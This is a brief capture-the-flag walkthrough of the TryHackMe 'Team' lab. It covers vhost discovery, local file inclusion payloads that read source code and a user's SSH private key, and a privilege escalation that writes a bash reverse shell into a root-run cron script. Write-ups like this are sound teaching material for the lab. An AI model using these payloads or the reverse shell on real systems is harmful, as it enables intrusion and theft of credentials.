Team

TryHackMe · Easy by Brenno M.

Team combines virtual host discovery, a local file inclusion (LFI) to read an SSH key, and a chained escalation abusing sudo permissions over scripts.

Reconnaissance

Nmap reveals FTP, SSH and HTTP. Add team.thm to /etc/hosts and discover the vHost dev.team.thm, whose script.php is vulnerable to LFI.

nmap -sC -sV <IP>
echo '<IP> team.thm dev.team.thm' | sudo tee -a /etc/hosts
ffuf -u http://<IP> -H 'Host: FUZZ.team.thm' -w wordlist -fs <size>

Foothold - LFI

The LFI, with the base64 wrapper, reads the source and then dale's private key, used to authenticate over SSH.

http://dev.team.thm/script.php?page=php://filter/convert.base64-encode/resource=teamshare.php
http://dev.team.thm/script.php?page=../../../../home/dale/.ssh/id_rsa
chmod 600 id_rsa && ssh -i id_rsa dale@<IP>

Privilege escalation

sudo -l lets dale run a script as gyles; from gyles, a script called by root's cron is writable, allowing injection of a privileged reverse shell.

sudo -u gyles /home/gyles/admin_checks
# as gyles, script in /usr/local/bin run by root:
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<MY_IP>/3333 0>&1' > /usr/local/bin/main_backup.sh
nc -nlvp 3333
cat /root/root.txt
